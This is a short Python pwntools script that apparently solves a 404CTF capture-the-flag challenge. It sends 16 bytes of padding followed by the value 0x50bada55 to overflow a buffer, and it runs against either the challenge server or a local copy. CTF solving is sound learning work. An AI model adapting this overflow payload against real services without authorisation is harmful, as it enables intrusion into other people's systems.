#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
$ nc challenges.404ctf.fr 30274
11a20Alors, t'es un magicien ?
AAAAAAAAAAAAAAAAAAAAAAAAA
Pas mal, mais il en faut plus pour m'impressionner !
746f6e20


$ nc localhost 4000
11a20Alors, t'es un magicien ?
AAAAAAAAAAAAAAAEDCBAAAA
Pas mal, mais il en faut plus pour m'impressionner !
41424344

'''

from pwn import *

if args.REMOTE:
  host, port = "challenges.404ctf.fr", "30274"
  p = remote(host,port)
else:
  host, port = "localhost", "4000"
  p = remote(host,port)
  pass


data_raw = p.recvline().decode().strip()
print(data_raw)

adresse = 0x50bada55
message = b'AAAAAAAAAAAAAAAA' + p32(adresse) + b'AAA'
p.sendline(message)
print(p.recvall().decode().strip())

# Fermeture de la connexion
p.close()
